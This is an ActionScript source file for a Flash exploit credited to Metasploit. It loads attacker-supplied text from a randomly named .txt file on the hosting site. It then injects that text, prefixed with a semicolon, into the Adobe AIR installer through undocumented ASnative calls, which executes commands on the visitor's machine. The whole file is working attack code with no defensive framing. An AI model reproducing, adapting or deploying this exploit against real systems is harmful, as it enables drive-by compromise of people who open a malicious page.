/*
Compile:	mtasc -version 8 -swf Exploit.swf -main -header 800:600:20 Exploit.as
Author:		0a29406d9794e4f9b30b3c5d6702c708 / Unknown / metasploit
PoC:		http://downloads.securityfocus.com/vulnerabilities/exploits/32896.as
*/

import flash.external.ExternalInterface;

class Exploit {

	public function randname(newLength:Number):String{
		var a:String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		var alphabet:Array = a.split("");
		var randomLetter:String = "";

		for (var i:Number = 0; i < newLength; i++){
			randomLetter += alphabet[Math.floor(Math.random() * alphabet.length)];
		}

		return randomLetter;
	}

	public function exploit() {
		var path:String = ExternalInterface.call("window.location.href.toString") + randname(6) + ".txt";
		var loadVars:LoadVars = new LoadVars();

		loadVars.onData = function(str:String):Void {
			if (str) {
				if (_global.ASnative(2201, 1)("airappinstaller")) {
					_global.ASnative(2201, 2)("airappinstaller", "; " + str);
				}
			} else {
				// FAIL
			}
		}
		loadVars.load(path);
	}

	public function Exploit() {
		exploit();
	}

	static function main() {
		var ex : Exploit;
		ex = new Exploit();
	}
}
